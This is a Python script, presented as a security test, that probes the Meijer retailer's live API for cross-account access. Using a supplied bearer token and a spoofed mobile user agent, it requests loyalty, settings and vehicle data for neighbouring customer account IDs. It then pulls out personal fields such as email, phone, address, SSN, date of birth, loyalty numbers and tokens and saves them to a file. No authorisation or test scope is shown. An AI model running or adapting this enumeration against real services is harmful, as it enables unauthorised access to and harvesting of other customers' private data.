#!/usr/bin/env python3
"""
Critical Security Test for Meijer API

Tests for the most critical vulnerabilities:
- Cross-account data access
- Account ID enumeration
- Information disclosure
"""

import json
import logging
import time
from typing import Any, Dict

import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class CriticalSecurityTester:
    """Critical security testing for Meijer API."""

    def __init__(self, access_token: str):
        self.access_token = access_token
        self.api_base = "https://api.meijer.com"
        self.session = requests.Session()
        self.session.headers.update(
            {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; One Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 (Mobile; afma-sdk-a-v251815999.244410000.1)",
                "Accept": "application/json",
            }
        )

    def test_cross_account_access(self):
        """Test if we can access other accounts' data."""
        logger.info("🔍 Testing cross-account access...")

        # Test different account IDs to see if we can access their data
        test_accounts = [
            13266596,  # Your account (baseline)
            13266595,  # Previous account
            13266597,  # Next account
            13266590,  # Earlier account
            13266600,  # Later account
            13266580,  # Much earlier account
            13266610,  # Much later account
        ]

        results = {}

        for account_id in test_accounts:
            try:
                logger.info(f"Testing account ID: {account_id}")

                # Test loyalty account endpoint
                url = f"{self.api_base}/loyalty/accounts/accounts/getAccount"
                params = {"accountId": account_id}

                response = self.session.get(url, params=params)

                if response.status_code == 200:
                    data = response.json()

                    # Check if we got meaningful data
                    if data and isinstance(data, dict) and len(data) > 0:
                        logger.warning(
                            "⚠️  CRITICAL VULNERABILITY: Cross-account access possible!"
                        )
                        logger.warning(f"   Account ID: {account_id}")
                        logger.warning(f"   Endpoint: {url}")
                        logger.warning(
                            f"   Response: {json.dumps(data, indent=2)[:500]}..."
                        )

                        # Extract sensitive information
                        sensitive_info = self._extract_sensitive_info(data)

                        results[account_id] = {
                            "status_code": 200,
                            "vulnerable": True,
                            "cross_account_access": True,
                            "sensitive_info": sensitive_info,
                            "data_summary": self._summarize_data(data),
                        }
                    else:
                        results[account_id] = {
                            "status_code": 200,
                            "vulnerable": False,
                            "cross_account_access": False,
                            "data": data,
                        }
                else:
                    results[account_id] = {
                        "status_code": response.status_code,
                        "vulnerable": False,
                        "cross_account_access": False,
                        "error": f"HTTP {response.status_code}",
                    }

                time.sleep(0.3)  # Rate limiting

            except Exception as e:
                logger.error(f"Error testing account {account_id}: {e}")
                results[account_id] = {"error": str(e)}

        return results

    def test_settings_endpoint_vulnerability(self):
        """Test the settings endpoint for account ID enumeration."""
        logger.info("🔍 Testing settings endpoint vulnerability...")

        # Test different account IDs in the settings endpoint
        test_accounts = [
            13266596,  # Your account
            13266595,  # Previous account
            13266597,  # Next account
            13266590,  # Earlier account
            13266600,  # Later account
        ]

        results = {}

        for account_id in test_accounts:
            try:
                url = f"{self.api_base}/s/settings/{account_id}/v1/mobile"
                logger.info(f"Testing settings endpoint with account ID: {account_id}")

                response = self.session.get(url)

                if response.status_code == 200:
                    data = response.json()
                    logger.warning(
                        f"⚠️  SETTINGS ENDPOINT VULNERABILITY: Got data for account {account_id}"
                    )
                    logger.warning(f"   URL: {url}")
                    logger.warning(
                        f"   Response: {json.dumps(data, indent=2)[:500]}..."
                    )

                    results[account_id] = {
                        "status_code": 200,
                        "vulnerable": True,
                        "data": data,
                    }
                else:
                    results[account_id] = {
                        "status_code": response.status_code,
                        "vulnerable": False,
                        "error": f"HTTP {response.status_code}",
                    }

                time.sleep(0.3)

            except Exception as e:
                logger.error(
                    f"Error testing settings endpoint for account {account_id}: {e}"
                )
                results[account_id] = {"error": str(e)}

        return results

    def test_vehicle_info_vulnerability(self):
        """Test if we can access other accounts' vehicle information."""
        logger.info("🔍 Testing vehicle information vulnerability...")

        test_accounts = [
            13266596,  # Your account
            13266595,  # Previous account
            13266597,  # Next account
        ]

        results = {}

        for account_id in test_accounts:
            try:
                url = f"{self.api_base}/loyalty/accounts/getVehicleInformation"
                params = {"accountId": account_id}

                logger.info(f"Testing vehicle info for account ID: {account_id}")

                response = self.session.get(url, params=params)

                if response.status_code == 200:
                    data = response.json()

                    if data and isinstance(data, dict) and len(data) > 0:
                        logger.warning(
                            f"⚠️  VEHICLE INFO VULNERABILITY: Got data for account {account_id}"
                        )
                        logger.warning(
                            f"   Response: {json.dumps(data, indent=2)[:300]}..."
                        )

                        results[account_id] = {
                            "status_code": 200,
                            "vulnerable": True,
                            "data": data,
                        }
                    else:
                        results[account_id] = {
                            "status_code": 200,
                            "vulnerable": False,
                            "data": data,
                        }
                else:
                    results[account_id] = {
                        "status_code": response.status_code,
                        "vulnerable": False,
                        "error": f"HTTP {response.status_code}",
                    }

                time.sleep(0.3)

            except Exception as e:
                logger.error(
                    f"Error testing vehicle info for account {account_id}: {e}"
                )
                results[account_id] = {"error": str(e)}

        return results

    def _extract_sensitive_info(self, data: Any) -> Dict[str, Any]:
        """Extract potentially sensitive information from response data."""
        sensitive_info = {}

        if isinstance(data, dict):
            sensitive_fields = [
                "email",
                "phone",
                "address",
                "ssn",
                "credit_card",
                "password",
                "token",
                "secret",
                "key",
                "id",
                "account",
                "firstName",
                "lastName",
                "dateOfBirth",
                "socialSecurityNumber",
                "mPerksId",
                "mPerksPhone",
                "loyaltyCardNumber",
                "employeeId",
            ]

            for field in sensitive_fields:
                if field in data:
                    sensitive_info[field] = data[field]
                elif field.lower() in data:
                    sensitive_info[field] = data[field.lower()]

            # Recursively check nested objects
            for key, value in data.items():
                if isinstance(value, (dict, list)):
                    nested_sensitive = self._extract_sensitive_info(value)
                    if nested_sensitive:
                        sensitive_info[f"{key}_nested"] = nested_sensitive

        elif isinstance(data, list):
            for i, item in enumerate(data):
                nested_sensitive = self._extract_sensitive_info(item)
                if nested_sensitive:
                    sensitive_info[f"item_{i}"] = nested_sensitive

        return sensitive_info

    def _summarize_data(self, data: Any) -> Dict[str, Any]:
        """Create a summary of the response data."""
        if isinstance(data, dict):
            return {"type": "object", "keys": list(data.keys()), "size": len(str(data))}
        elif isinstance(data, list):
            return {"type": "array", "length": len(data), "size": len(str(data))}
        else:
            return {"type": type(data).__name__, "value": str(data)[:100]}

    def run_critical_tests(self):
        """Run all critical security tests."""
        logger.info("🚨 Starting CRITICAL security testing...")

        results = {
            "cross_account_access": self.test_cross_account_access(),
            "settings_endpoint_vulnerability": self.test_settings_endpoint_vulnerability(),
            "vehicle_info_vulnerability": self.test_vehicle_info_vulnerability(),
        }

        # Save results
        with open("critical_security_results.json", "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info(
            "✅ Critical security testing completed. Results saved to critical_security_results.json"
        )
        return results


def main():
    """Main function to run critical security tests."""
    print("🚨 Meijer API CRITICAL Security Testing Tool")
    print("=" * 55)

    # Get access token from user
    access_token = input("Enter your Meijer access token: ").strip()

    if not access_token:
        print("❌ No access token provided")
        return

    # Create tester and run tests
    tester = CriticalSecurityTester(access_token)
    results = tester.run_critical_tests()

    # Print summary
    print("\n📊 CRITICAL Security Test Summary:")
    print("=" * 40)

    for test_name, test_results in results.items():
        print(f"\n{test_name.upper()}:")
        if isinstance(test_results, dict):
            for key, value in test_results.items():
                if isinstance(value, dict) and "vulnerable" in value:
                    if value["vulnerable"]:
                        print(f"  {key}: 🚨 CRITICAL VULNERABILITY")
                        if (
                            "cross_account_access" in value
                            and value["cross_account_access"]
                        ):
                            print("    ⚠️  Cross-account access possible!")
                    else:
                        print(f"  {key}: 🟢 Secure")
                elif isinstance(value, list):
                    print(f"  {key}: {len(value)} results")
                else:
                    print(f"  {key}: {value}")


if __name__ == "__main__":
    main()
